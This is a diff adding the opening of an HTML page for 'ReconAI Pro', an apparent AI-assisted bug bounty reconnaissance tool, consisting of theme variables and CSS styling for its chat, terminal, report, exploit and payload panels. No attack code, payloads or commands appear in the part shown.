@@ -1,0 +1,2967 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ReconAI Pro — AI-Powered Bug Bounty Recon</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:#080c14; --bg2:#0d1220; --bg3:#111827;
+    --card:rgba(255,255,255,0.03); --card-border:rgba(99,102,241,0.2);
+    --primary:#6366f1; --primary-glow:rgba(99,102,241,0.3);
+    --violet:#8b5cf6; --cyan:#22d3ee; --green:#10b981;
+    --red:#ef4444; --amber:#f59e0b; --text:#e2e8f0; --muted:#64748b;
+    --mono:'Space Mono',monospace; --display:'Syne',sans-serif;
+  }
+
+  /* ── LIGHT THEME ── */
+  [data-theme="light"] {
+    --bg:#f0f2f8; --bg2:#e8eaf2; --bg3:#ffffff;
+    --card:rgba(99,102,241,0.06); --card-border:rgba(99,102,241,0.25);
+    --primary:#4f46e5; --primary-glow:rgba(79,70,229,0.25);
+    --violet:#7c3aed; --cyan:#0891b2; --green:#059669;
+    --red:#dc2626; --amber:#d97706; --text:#1e293b; --muted:#64748b;
+  }
+  [data-theme="light"] body { background:var(--bg); }
+  [data-theme="light"] body::after { opacity:0.08; filter:grayscale(0.6); }
+  [data-theme="light"] body::before {
+    background-image:
+      linear-gradient(rgba(99,102,241,0.04) 1px,transparent 1px),
+      linear-gradient(90deg,rgba(99,102,241,0.04) 1px,transparent 1px);
+    background-size:40px 40px, 40px 40px;
+  }
+  [data-theme="light"] nav { background:rgba(240,242,248,0.92); }
+  [data-theme="light"] .auth-overlay { background:rgba(240,242,248,0.97); }
+  [data-theme="light"] .auth-box { background:var(--bg2); }
+  [data-theme="light"] .msg.ai .msg-bubble { background:#ffffff; }
+  [data-theme="light"] .chat-messages { background:var(--bg2); }
+  [data-theme="light"] .terminal-box { filter:brightness(1); }
+  [data-theme="light"] .terminal-output { background:#1a1f2e; }
+  [data-theme="light"] .exploit-content { background:#1a1f2e; }
+  [data-theme="light"] .r-code { background:rgba(30,41,59,0.08); color:#0891b2; }
+  [data-theme="light"] .payload-block { background:rgba(30,41,59,0.06); }
+  [data-theme="light"] .user-dropdown { background:var(--bg2); }
+  [data-theme="light"] .voice-status { background:var(--bg2); }
+  [data-theme="light"] .report-content th { color:var(--primary); }
+  [data-theme="light"] .scans-table tr:hover td { background:rgba(99,102,241,0.05); }
+  [data-theme="light"] #wordlist-raw { color:var(--cyan); }
+  [data-theme="light"] .ambient-1,.ambient-2 { opacity:0.06; }
+  [data-theme="light"] .ambient-3 { opacity:0.04; }
+
+  /* ── THEME TOGGLE BUTTON ── */
+  .theme-toggle {
+    width:38px; height:38px;
+    background:var(--card); border:1px solid var(--card-border);
+    border-radius:8px; color:var(--muted);
+    cursor:pointer; display:flex; align-items:center;
+    justify-content:center; font-size:16px;
+    transition:all .2s; flex-shrink:0;
+  }
+  .theme-toggle:hover { border-color:var(--primary); color:var(--primary); transform:scale(1.05); }
+  *{margin:0;padding:0;box-sizing:border-box;}
+
+  /* ── BACKGROUND IMAGE ── */
+  body{
+    background:var(--bg);
+    color:var(--text);
+    font-family:var(--mono);
+    min-height:100vh;
+    overflow-x:hidden;
+  }
+
+  /* Layer 1 — the actual wallpaper, fixed & full-cover */
+  body::after{
+    content:'';
+    position:fixed;
+    inset:0;
+    background-image:url('anonymous-3840x2160-13681.png');
+    background-size:cover;
+    background-position:center center;
+    background-repeat:no-repeat;
+    /* deep dark vignette so edges are pure black, face glows subtly */
+    -webkit-mask-image:radial-gradient(ellipse 55% 60% at 50% 42%, rgba(0,0,0,0.72) 0%, rgba(0,0,0,0.45) 40%, rgba(0,0,0,0) 100%);
+    mask-image:radial-gradient(ellipse 55% 60% at 50% 42%, rgba(0,0,0,0.72) 0%, rgba(0,0,0,0.45) 40%, rgba(0,0,0,0) 100%);
+    pointer-events:none;
+    z-index:0;
+    opacity:0.38;
+  }
+
+  /* Layer 2 — subtle scanlines for cyberpunk texture */
+  body::before{
+    content:'';
+    position:fixed;
+    inset:0;
+    background-image:
+      /* scanlines */
+      repeating-linear-gradient(
+        0deg,
+        transparent,
+        transparent 2px,
+        rgba(0,0,0,0.18) 2px,
+        rgba(0,0,0,0.18) 4px
+      ),
+      /* grid overlay */
+      linear-gradient(rgba(99,102,241,0.035) 1px,transparent 1px),
+      linear-gradient(90deg,rgba(99,102,241,0.035) 1px,transparent 1px);
+    background-size:100% 4px, 40px 40px, 40px 40px;
+    pointer-events:none;
+    z-index:1;
+  }
+
+  .ambient{position:fixed;border-radius:50%;filter:blur(120px);pointer-events:none;z-index:0;opacity:0.13;}
+  .ambient-1{width:600px;height:600px;background:var(--primary);top:-200px;left:-200px;}
+  .ambient-2{width:400px;height:400px;background:var(--violet);bottom:-100px;right:-100px;}
+
+  /* subtle red glow at center-bottom to echo the mask's red tones */
+  .ambient-3{
+    position:fixed;
+    width:500px;height:300px;
+    background:radial-gradient(ellipse, rgba(180,20,20,0.18) 0%, transparent 70%);
+    bottom:5%;left:50%;transform:translateX(-50%);
+    pointer-events:none;z-index:0;
+    filter:blur(60px);
+  }
+  #app{position:relative;z-index:2;}
+
+  /* ── NAV ── */
+  nav{display:flex;align-items:center;justify-content:space-between;padding:18px 40px;border-bottom:1px solid var(--card-border);backdrop-filter:blur(20px);background:rgba(8,12,20,0.8);position:sticky;top:0;z-index:100;}
+  .logo{font-family:var(--display);font-size:20px;font-weight:800;background:linear-gradient(135deg,var(--primary),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:-0.5px;}
+  .api-status{display:flex;align-items:center;gap:8px;font-size:11px;padding:6px 12px;border-radius:8px;border:1px solid var(--card-border);background:var(--card);}
+  .api-dot{width:7px;height:7px;border-radius:50%;background:var(--muted);}
+  .api-dot.ok{background:var(--green);animation:pulse 2s infinite;}
+  .api-dot.err{background:var(--red);}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+  .nav-tabs{display:flex;gap:4px;background:var(--card);border:1px solid var(--card-border);border-radius:10px;padding:4px;}
+  .nav-tab{padding:7px 16px;border-radius:7px;font-size:12px;cursor:pointer;border:none;background:transparent;color:var(--muted);font-family:var(--mono);transition:all .2s;}
+  .nav-tab.active{background:var(--primary);color:white;}
+  .nav-tab:hover:not(.active){color:var(--text);background:rgba(255,255,255,.05);}
+
+  /* ── PAGES ── */
+  .page{display:none;} .page.active{display:block;}
+
+  /* ── HERO ── */
+  .hero{padding:70px 40px 50px;text-align:center;max-width:900px;margin:0 auto;}
+  .hero-tag{display:inline-flex;align-items:center;gap:8px;font-size:11px;color:var(--cyan);border:1px solid rgba(34,211,238,.3);padding:6px 14px;border-radius:20px;margin-bottom:28px;background:rgba(34,211,238,.05);animation:fadeInDown .5s ease;}
+  .hero h1{font-family:var(--display);font-size:clamp(34px,6vw,68px);font-weight:800;line-height:1.05;letter-spacing:-2px;margin-bottom:22px;animation:fadeInUp .5s ease .1s both;}
+  .grad{background:linear-gradient(135deg,var(--primary) 0%,var(--violet) 40%,var(--cyan) 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+  .hero p{font-size:14px;color:var(--muted);line-height:1.8;max-width:580px;margin:0 auto 36px;animation:fadeInUp .5s ease .2s both;}
+  .hero-cta{display:flex;gap:12px;justify-content:center;flex-wrap:wrap;animation:fadeInUp .5s ease .3s both;}
+  .btn-primary{padding:13px 28px;background:linear-gradient(135deg,var(--primary),var(--violet));border:none;border-radius:10px;color:white;font-family:var(--mono);font-size:13px;cursor:pointer;transition:all .2s;box-shadow:0 0 30px var(--primary-glow);}
+  .btn-primary:hover{transform:translateY(-2px);box-shadow:0 0 50px var(--primary-glow);}
+  .btn-secondary{padding:13px 28px;background:var(--card);border:1px solid var(--card-border);border-radius:10px;color:var(--text);font-family:var(--mono);font-size:13px;cursor:pointer;transition:all .2s;}
+  .btn-secondary:hover{border-color:var(--primary);color:var(--primary);}
+  .stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;max-width:900px;margin:50px auto 0;padding:0 40px;animation:fadeInUp .5s ease .4s both;}
+  .stat-card{background:var(--card);border:1px solid var(--card-border);border-radius:12px;padding:20px;text-align:center;}
+  .stat-num{font-family:var(--display);font-size:28px;font-weight:800;background:linear-gradient(135deg,var(--primary),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+  .stat-label{font-size:10px;color:var(--muted);margin-top:4px;}
+  .phases-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:16px;max-width:900px;margin:50px auto 0;padding:0 40px 70px;}
+  .phase-card{background:var(--card);border:1px solid var(--card-border);border-radius:14px;padding:24px;transition:border-color .2s;}
+  .phase-card:hover{border-color:var(--primary);}
+  .phase-num{font-size:10px;color:var(--primary);font-weight:700;text-transform:uppercase;letter-spacing:2px;margin-bottom:8px;}
+  .phase-title{font-family:var(--display);font-size:16px;font-weight:700;margin-bottom:10px;}
+  .phase-desc{font-size:11px;color:var(--muted);line-height:1.7;}
+  .phase-tools{display:flex;flex-wrap:wrap;gap:6px;margin-top:14px;}
+  .tool-chip{font-size:10px;padding:3px 8px;border-radius:5px;background:rgba(99,102,241,.1);border:1px solid rgba(99,102,241,.2);color:var(--primary);}
+
+  /* ── AI MODEL BADGE ── */
+  .model-badge-row{display:flex;gap:12px;justify-content:center;margin:30px 0 0;flex-wrap:wrap;padding:0 40px;}
+  .model-badge{display:flex;align-items:center;gap:8px;padding:10px 18px;border-radius:10px;border:1px solid var(--card-border);background:var(--card);font-size:11px;}
+  .mb-icon{font-size:16px;}
+  .mb-label{color:var(--muted);}
+  .mb-val{color:var(--cyan);font-weight:700;}
+
+  /* ── RECON LAYOUT ── */
+  .recon-layout{display:grid;grid-template-columns:360px 1fr;gap:20px;padding:24px 40px;min-height:calc(100vh - 65px);}
+  .chat-panel{display:flex;flex-direction:column;}
+  .panel-header{background:var(--card);border:1px solid var(--card-border);border-bottom:none;border-radius:14px 14px 0 0;padding:14px 18px;display:flex;align-items:center;gap:10px;}
+  .panel-header-icon{width:32px;height:32px;background:linear-gradient(135deg,var(--primary),var(--violet));border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:15px;}
+  .panel-title{font-family:var(--display);font-size:14px;font-weight:700;}
+  .panel-sub{font-size:10px;color:var(--muted);}
+  .chat-messages{background:var(--bg2);border:1px solid var(--card-border);border-top:none;border-bottom:none;flex:1;min-height:400px;max-height:440px;overflow-y:auto;padding:14px;display:flex;flex-direction:column;gap:10px;scroll-behavior:smooth;}
+  .chat-messages::-webkit-scrollbar{width:4px;}
+  .chat-messages::-webkit-scrollbar-thumb{background:var(--card-border);border-radius:4px;}
+  .msg{display:flex;gap:8px;animation:msgIn .3s ease;}
+  @keyframes msgIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+  .msg.user{flex-direction:row-reverse;}
+  .msg-avatar{width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:12px;flex-shrink:0;}
+  .msg.ai .msg-avatar{background:linear-gradient(135deg,var(--primary),var(--violet));}
+  .msg.user .msg-avatar{background:var(--bg3);border:1px solid var(--card-border);}
+  .msg-bubble{max-width:85%;padding:10px 13px;border-radius:11px;font-size:12px;line-height:1.7;}
+  .msg.ai .msg-bubble{background:var(--bg3);border:1px solid var(--card-border);}
+  .msg.user .msg-bubble{background:linear-gradient(135deg,var(--primary),var(--violet));color:white;}
+  .msg-bubble code{background:rgba(0,0,0,.35);padding:1px 5px;border-radius:4px;font-size:11px;color:var(--cyan);}
+  .quick-replies{display:flex;flex-wrap:wrap;gap:5px;margin-top:7px;}
+  .qr-btn{font-size:10px;padding:5px 9px;border-radius:6px;border:1px solid var(--card-border);background:transparent;color:var(--primary);cursor:pointer;font-family:var(--mono);transition:all .15s;}
+  .qr-btn:hover{background:rgba(99,102,241,.15);border-color:var(--primary);}
+  .qr-btn:disabled{opacity:.5;cursor:default;}
+  .thinking{display:flex;align-items:center;gap:6px;padding:8px 12px;background:var(--bg3);border:1px solid var(--card-border);border-radius:10px;font-size:11px;color:var(--muted);width:fit-content;}
+  .thinking-dots{display:flex;gap:3px;}
+  .thinking-dots span{width:5px;height:5px;border-radius:50%;background:var(--primary);animation:dotb 1.2s infinite;}
+  .thinking-dots span:nth-child(2){animation-delay:.2s;}
+  .thinking-dots span:nth-child(3){animation-delay:.4s;}
+  @keyframes dotb{0%,80%,100%{transform:scale(.6);opacity:.5}40%{transform:scale(1);opacity:1}}
+  .chat-input-area{background:var(--card);border:1px solid var(--card-border);border-top:none;border-radius:0 0 14px 14px;padding:12px;display:flex;gap:8px;align-items:flex-end;}
+  .chat-input{flex:1;background:var(--bg3);border:1px solid var(--card-border);border-radius:8px;padding:9px 12px;color:var(--text);font-family:var(--mono);font-size:12px;resize:none;outline:none;min-height:38px;max-height:90px;transition:border-color .2s;line-height:1.5;}
+  .chat-input:focus{border-color:var(--primary);}
+  .send-btn{width:38px;height:38px;background:linear-gradient(135deg,var(--primary),var(--violet));border:none;border-radius:8px;color:white;cursor:pointer;font-size:15px;display:flex;align-items:center;justify-content:center;transition:all .2s;flex-shrink:0;}
+  .send-btn:hover{transform:scale(1.05);}
+  .send-btn:disabled{opacity:.4;cursor:not-allowed;transform:none;}
+
+  /* ── OUTPUT PANEL ── */
+  .output-panel{display:flex;flex-direction:column;gap:14px;}
+  .phases-progress{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;}
+  .phase-progress-card{background:var(--card);border:1px solid var(--card-border);border-radius:10px;padding:12px;transition:border-color .3s;}
+  .phase-progress-card.active{border-color:var(--primary);}
+  .phase-progress-card.done{border-color:var(--green);}
+  .pp-label{font-size:10px;color:var(--muted);margin-bottom:5px;}
+  .pp-name{font-size:11px;font-weight:700;margin-bottom:7px;}
+  .pp-bar-track{height:3px;background:var(--bg3);border-radius:2px;overflow:hidden;}
+  .pp-bar-fill{height:100%;border-radius:2px;background:var(--primary);width:0%;transition:width .5s ease;}
+  .phase-progress-card.done .pp-bar-fill{background:var(--green);width:100%;}
+  .phase-progress-card.active .pp-bar-fill{background:linear-gradient(90deg,var(--primary),var(--cyan));animation:barpulse 1.5s infinite;}
+  @keyframes barpulse{0%,100%{opacity:1}50%{opacity:.6}}
+  .pp-status{font-size:10px;margin-top:5px;}
+  .pp-status.done{color:var(--green);}
+  .pp-status.active{color:var(--primary);}
+  .pp-status.idle{color:var(--muted);}
+
+  /* ── TERMINAL ── */
+  .terminal-box{background:#060a10;border:1px solid var(--card-border);border-radius:14px;overflow:hidden;display:flex;flex-direction:column;}
+  .terminal-header{padding:11px 16px;border-bottom:1px solid var(--card-border);display:flex;align-items:center;gap:8px;background:var(--bg2);}
+  .term-dots{display:flex;gap:5px;}
+  .term-dot{width:11px;height:11px;border-radius:50%;}
+  .term-dot:nth-child(1){background:#ef4444;}
+  .term-dot:nth-child(2){background:#f59e0b;}
+  .term-dot:nth-child(3){background:#10b981;}
+  .term-title{font-size:11px;color:var(--muted);margin-left:4px;}
+  .term-status-dot{margin-left:auto;width:8px;height:8px;border-radius:50%;background:var(--muted);}
+  .term-status-dot.running{background:var(--green);animation:pulse 1s infinite;}
+  .terminal-output{flex:1;padding:14px;overflow-y:auto;font-size:11px;line-height:1.75;min-height:260px;max-height:320px;font-family:var(--mono);}
+  .terminal-output::-webkit-scrollbar{width:4px;}
+  .terminal-output::-webkit-scrollbar-thumb{background:#1a2030;border-radius:4px;}
+  .t-line{margin-bottom:1px;}
+  .t-line.cmd{color:var(--cyan);}
+  .t-line.info{color:var(--muted);}
+  .t-line.success{color:var(--green);}
+  .t-line.warn{color:var(--amber);}
+  .t-line.error{color:var(--red);}
+  .t-line.phase{color:var(--violet);font-weight:700;padding:3px 0;}
+  .t-prompt{color:var(--primary);}
+  .t-cursor{display:inline-block;width:8px;height:13px;background:var(--primary);vertical-align:middle;animation:blink 1s infinite;}
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+
+  /* ── REPORT ── */
+  .report-section{background:var(--card);border:1px solid var(--card-border);border-radius:14px;padding:18px;display:none;}
+  .report-section.visible{display:block;}
+  .report-header-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;}
+  .report-title-label{font-family:var(--display);font-size:15px;font-weight:700;}
+  .report-actions{display:flex;gap:7px;}
+  .report-btn{font-size:11px;padding:6px 13px;border-radius:7px;border:1px solid var(--card-border);background:transparent;color:var(--text);cursor:pointer;font-family:var(--mono);transition:all .15s;}
+  .report-btn:hover{border-color:var(--primary);color:var(--primary);}
+  .report-btn.copy-success{border-color:var(--green);color:var(--green);}
+  .report-content{background:var(--bg2);border-radius:10px;padding:18px;font-size:12px;line-height:1.8;max-height:380px;overflow-y:auto;white-space:pre-wrap;}
+  .report-content::-webkit-scrollbar{width:4px;}
+  .report-content::-webkit-scrollbar-thumb{background:var(--card-border);border-radius:4px;}
+  .r-h1{font-family:var(--display);font-size:17px;font-weight:800;color:white;margin-bottom:4px;}
+  .r-h2{font-family:var(--display);font-size:13px;font-weight:700;color:var(--cyan);margin:14px 0 7px;border-bottom:1px solid var(--card-border);padding-bottom:3px;}
+  .r-h3{font-size:12px;font-weight:700;color:var(--violet);margin:9px 0 3px;}
+  .r-code{background:rgba(0,0,0,.4);border:1px solid rgba(99,102,241,.2);border-radius:8px;padding:11px;font-size:11px;color:var(--cyan);margin:7px 0;display:block;overflow-x:auto;white-space:pre;}
+  .report-content table{width:100%;border-collapse:collapse;margin:9px 0;font-size:11px;}
+  .report-content th{background:rgba(99,102,241,.1);color:var(--primary);padding:6px 9px;text-align:left;border:1px solid var(--card-border);}
+  .report-content td{padding:5px 9px;border:1px solid rgba(255,255,255,.05);color:var(--text);}
+  .report-content tr:nth-child(even) td{background:rgba(255,255,255,.02);}
+
+  /* ── EXPLOIT SECTION ── */
+  .exploit-section{background:var(--card);border:1px solid rgba(239,68,68,.25);border-radius:14px;padding:18px;display:none;}
+  .exploit-section.visible{display:block;animation:fadeInUp .4s ease;}
+  .exploit-title-label{font-family:var(--display);font-size:15px;font-weight:700;color:var(--red);display:flex;align-items:center;gap:8px;}
+  .exploit-disclaimer{font-size:10px;color:var(--amber);background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.2);border-radius:8px;padding:9px 13px;margin-bottom:12px;line-height:1.6;}
+  .exploit-content{background:#060a10;border-radius:10px;padding:18px;font-size:11px;line-height:1.8;max-height:420px;overflow-y:auto;white-space:pre-wrap;font-family:var(--mono);}
+  .exploit-content::-webkit-scrollbar{width:4px;}
+  .exploit-content::-webkit-scrollbar-thumb{background:rgba(239,68,68,.3);border-radius:4px;}
+  .e-h1{font-family:var(--display);font-size:16px;font-weight:800;color:var(--red);margin-bottom:4px;}
+  .e-h2{font-family:var(--display);font-size:13px;font-weight:700;color:var(--amber);margin:14px 0 7px;border-bottom:1px solid rgba(239,68,68,.15);padding-bottom:3px;}
+  .e-h3{font-size:12px;font-weight:700;color:var(--red);margin:10px 0 3px;}
+  .e-code{background:rgba(0,0,0,.5);border:1px solid rgba(239,68,68,.2);border-radius:8px;padding:11px;font-size:11px;color:#ff6b6b;margin:7px 0;display:block;overflow-x:auto;white-space:pre;}
+  .exploit-content table{width:100%;border-collapse:collapse;margin:9px 0;font-size:11px;}
+  .exploit-content th{background:rgba(239,68,68,.1);color:var(--red);padding:6px 9px;text-align:left;border:1px solid rgba(239,68,68,.2);}
+  .exploit-content td{padding:5px 9px;border:1px solid rgba(255,255,255,.04);color:var(--text);}
+  .exploit-phases{display:grid;grid-template-columns:repeat(5,1fr);gap:7px;margin-bottom:12px;}
+  .exp-phase-chip{background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.15);border-radius:8px;padding:7px 9px;font-size:10px;text-align:center;color:var(--muted);transition:all .3s;}
+  .exp-phase-chip.active{border-color:var(--red);color:var(--red);background:rgba(239,68,68,.1);}
+  .exp-phase-chip.done{border-color:var(--amber);color:var(--amber);background:rgba(245,158,11,.08);}
+  .exp-phase-chip-icon{font-size:13px;display:block;margin-bottom:2px;}
+
+  /* ── DASHBOARD ── */
+  .dashboard-layout{padding:28px 40px;}
+  .dash-title{font-family:var(--display);font-size:22px;font-weight:800;margin-bottom:6px;}
+  .dash-sub{color:var(--muted);font-size:12px;margin-bottom:26px;}
+  .dash-stats{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:26px;}
+  .dash-stat{background:var(--card);border:1px solid var(--card-border);border-radius:12px;padding:18px;}
+  .dash-stat-label{font-size:10px;color:var(--muted);margin-bottom:5px;text-transform:uppercase;letter-spacing:1px;}
+  .dash-stat-value{font-family:var(--display);font-size:26px;font-weight:800;}
+  .dash-stat-value.green{color:var(--green);}
+  .dash-stat-value.primary{color:var(--primary);}
+  .dash-stat-value.amber{color:var(--amber);}
+  .dash-stat-value.red{color:var(--red);}
+  .dash-stat-change{font-size:10px;color:var(--muted);margin-top:4px;}
+  .scans-table-wrap{background:var(--card);border:1px solid var(--card-border);border-radius:14px;overflow:hidden;}
+  .scans-table-header{padding:14px 18px;border-bottom:1px solid var(--card-border);display:flex;align-items:center;justify-content:space-between;}
+  .scans-table-title{font-family:var(--display);font-size:14px;font-weight:700;}
+  table.scans-table{width:100%;border-collapse:collapse;font-size:12px;}
+  .scans-table th{padding:9px 18px;text-align:left;color:var(--muted);font-size:10px;text-transform:uppercase;letter-spacing:1px;font-weight:400;border-bottom:1px solid var(--card-border);}
+  .scans-table td{padding:11px 18px;border-bottom:1px solid rgba(255,255,255,.03);}
+  .scans-table tr:last-child td{border-bottom:none;}
+  .scans-table tr:hover td{background:rgba(255,255,255,.02);}
+  .sev-high{display:inline-flex;align-items:center;gap:4px;padding:3px 8px;border-radius:5px;font-size:10px;background:rgba(245,158,11,.15);color:var(--amber);border:1px solid rgba(245,158,11,.3);}
+  .sev-critical{display:inline-flex;align-items:center;gap:4px;padding:3px 8px;border-radius:5px;font-size:10px;background:rgba(239,68,68,.15);color:var(--red);border:1px solid rgba(239,68,68,.3);}
+  .status-done{display:inline-flex;align-items:center;gap:5px;padding:3px 10px;border-radius:20px;font-size:10px;background:rgba(16,185,129,.1);color:var(--green);border:1px solid rgba(16,185,129,.2);}
+  .status-dot{width:6px;height:6px;border-radius:50%;background:currentColor;}
+  .view-report-btn{font-size:10px;padding:5px 10px;border-radius:6px;border:1px solid var(--card-border);background:transparent;color:var(--primary);cursor:pointer;font-family:var(--mono);transition:all .15s;}
+  .view-report-btn:hover{background:rgba(99,102,241,.1);}
+
+  /* ── SETTINGS ── */
+  .settings-layout{padding:28px 40px;max-width:700px;}
+  .settings-title{font-family:var(--display);font-size:22px;font-weight:800;margin-bottom:6px;}
+  .settings-sub{color:var(--muted);font-size:12px;margin-bottom:26px;}
+  .settings-card{background:var(--card);border:1px solid var(--card-border);border-radius:14px;padding:22px;margin-bottom:16px;}
+  .settings-card-title{font-family:var(--display);font-size:13px;font-weight:700;margin-bottom:14px;display:flex;align-items:center;gap:8px;}
+  .settings-field label{font-size:11px;color:var(--muted);display:block;margin-bottom:6px;}
+  .settings-input{width:100%;background:var(--bg3);border:1px solid var(--card-border);border-radius:8px;padding:10px 14px;color:var(--text);font-family:var(--mono);font-size:12px;outline:none;transition:border-color .2s;}
+  .settings-input:focus{border-color:var(--primary);}
+  .settings-save-btn{margin-top:12px;padding:9px 20px;background:linear-gradient(135deg,var(--primary),var(--violet));border:none;border-radius:8px;color:white;font-family:var(--mono);font-size:12px;cursor:pointer;transition:all .2s;}
+  .settings-save-btn:hover{transform:translateY(-1px);}
+  .api-test-result{font-size:11px;margin-top:8px;padding:8px 12px;border-radius:6px;}
+  .api-test-result.ok{background:rgba(16,185,129,.1);color:var(--green);border:1px solid rgba(16,185,129,.2);}
+  .api-test-result.err{background:rgba(239,68,68,.1);color:var(--red);border:1px solid rgba(239,68,68,.2);}
+  .model-info{background:rgba(99,102,241,.06);border:1px solid rgba(99,102,241,.15);border-radius:10px;padding:14px;margin-top:14px;}
+  .model-info-title{font-size:11px;color:var(--primary);font-weight:700;margin-bottom:10px;}
+  .model-feat{display:flex;align-items:flex-start;gap:8px;font-size:11px;color:var(--muted);margin-bottom:6px;line-height:1.5;}
+  .model-feat-icon{color:var(--green);flex-shrink:0;}
+
+  /* ── TOOLKIT ── */
+  .tool-nav-btn{padding:8px 16px;border-radius:8px;font-size:12px;cursor:pointer;border:1px solid var(--card-border);background:var(--card);color:var(--muted);font-family:var(--mono);transition:all .2s;}
+  .tool-nav-btn.active{background:var(--primary);color:white;border-color:var(--primary);}
+  .tool-nav-btn:hover:not(.active){color:var(--text);border-color:var(--primary);}
+  .toolkit-panel{}
+  .tk-card{background:var(--card);border:1px solid var(--card-border);border-radius:14px;padding:22px;margin-bottom:16px;}
+  .tk-card-title{font-family:var(--display);font-size:14px;font-weight:700;margin-bottom:16px;}
+  .tk-row{display:flex;gap:10px;align-items:flex-end;flex-wrap:wrap;}
+  .cve-card{background:var(--bg2);border:1px solid var(--card-border);border-radius:10px;padding:14px;margin-bottom:10px;transition:border-color .2s;}
+  .cve-card:hover{border-color:var(--primary);}
+  .cve-card-header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;}
+  .cve-id{font-family:var(--mono);font-size:12px;color:var(--cyan);font-weight:700;}
+  .cve-score{font-size:11px;padding:2px 8px;border-radius:4px;font-weight:700;}
+  .cve-score.crit{background:rgba(239,68,68,.2);color:var(--red);}
+  .cve-score.high{background:rgba(245,158,11,.2);color:var(--amber);}
+  .cve-score.med{background:rgba(99,102,241,.2);color:var(--primary);}
+  .cve-score.low{background:rgba(16,185,129,.2);color:var(--green);}
+  .cve-desc{font-size:11px;color:var(--muted);line-height:1.6;margin-bottom:8px;}
+  .cve-tags{display:flex;gap:5px;flex-wrap:wrap;}
+  .cve-tag{font-size:10px;padding:2px 7px;border-radius:4px;background:rgba(99,102,241,.1);border:1px solid rgba(99,102,241,.2);color:var(--primary);}
+  .payload-block{background:#060a10;border:1px solid rgba(99,102,241,.2);border-radius:10px;padding:14px;margin-bottom:10px;}
+  .payload-label{font-size:10px;color:var(--violet);font-weight:700;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px;}
+  .payload-code{font-size:11px;color:var(--cyan);line-height:1.9;font-family:var(--mono);white-space:pre-wrap;word-break:break-all;}
+  .payload-copy-btn{font-size:10px;padding:4px 9px;border-radius:5px;border:1px solid var(--card-border);background:transparent;color:var(--muted);cursor:pointer;margin-top:8px;font-family:var(--mono);}
+  .payload-copy-btn:hover{border-color:var(--primary);color:var(--primary);}
+  .report-out{background:var(--bg2);border:1px solid var(--card-border);border-radius:10px;padding:16px;font-size:12px;line-height:1.8;max-height:500px;overflow-y:auto;white-space:pre-wrap;font-family:var(--mono);}
+
+  @keyframes fadeInDown{from{opacity:0;transform:translateY(-15px)}to{opacity:1;transform:none}}
+  @keyframes fadeInUp{from{opacity:0;transform:translateY(15px)}to{opacity:1;transform:none}}
+
+  /* ── LOGIN / SIGNUP ── */
+  .auth-overlay{position:fixed;inset:0;background:rgba(8,12,20,0.97);z-index:1000;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(20px);}
+  .auth-overlay.hidden{display:none;}
+  .auth-box{background:var(--bg2);border:1px solid var(--card-border);border-radius:20px;padding:40px;width:100%;max-width:420px;position:relative;animation:fadeInUp .4s ease;}
+  .auth-logo{font-family:var(--display);font-size:24px;font-weight:800;background:linear-gradient(135deg,var(--primary),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-align:center;margin-bottom:6px;}
+  .auth-tagline{text-align:center;font-size:11px;color:var(--muted);margin-bottom:28px;}
+  .auth-tabs{display:flex;background:var(--bg3);border-radius:10px;padding:4px;margin-bottom:24px;}
+  .auth-tab{flex:1;padding:8px;border:none;background:transparent;color:var(--muted);font-family:var(--mono);font-size:12px;cursor:pointer;border-radius:7px;transition:all .2s;}
+  .auth-tab.active{background:var(--primary);color:white;}
+  .auth-field{margin-bottom:16px;}
+  .auth-field label{display:block;font-size:11px;color:var(--muted);margin-bottom:6px;}
+  .auth-input{width:100%;background:var(--bg3);border:1px solid var(--card-border);border-radius:9px;padding:11px 14px;color:var(--text);font-family:var(--mono);font-size:12px;outline:none;transition:border-color .2s;}
+  .auth-input:focus{border-color:var(--primary);}
+  .auth-btn{width:100%;padding:12px;background:linear-gradient(135deg,var(--primary),var(--violet));border:none;border-radius:9px;color:white;font-family:var(--mono);font-size:13px;cursor:pointer;margin-top:4px;transition:all .2s;font-weight:700;}
+  .auth-btn:hover{transform:translateY(-1px);box-shadow:0 0 30px var(--primary-glow);}
+  .auth-divider{text-align:center;font-size:11px;color:var(--muted);margin:16px 0;position:relative;}
+  .auth-divider::before,.auth-divider::after{content:'';position:absolute;top:50%;width:40%;height:1px;background:var(--card-border);}
+  .auth-divider::before{left:0;} .auth-divider::after{right:0;}
+  .auth-guest{width:100%;padding:10px;background:transparent;border:1px solid var(--card-border);border-radius:9px;color:var(--muted);font-family:var(--mono);font-size:12px;cursor:pointer;transition:all .2s;}
+  .auth-guest:hover{border-color:var(--primary);color:var(--primary);}
+  .auth-error{font-size:11px;color:var(--red);background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.2);border-radius:7px;padding:8px 12px;margin-bottom:12px;display:none;}
+  .auth-error.show{display:block;}
+  .auth-success{font-size:11px;color:var(--green);background:rgba(16,185,129,.1);border:1px solid rgba(16,185,129,.2);border-radius:7px;padding:8px 12px;margin-bottom:12px;display:none;}
+  .auth-success.show{display:block;}
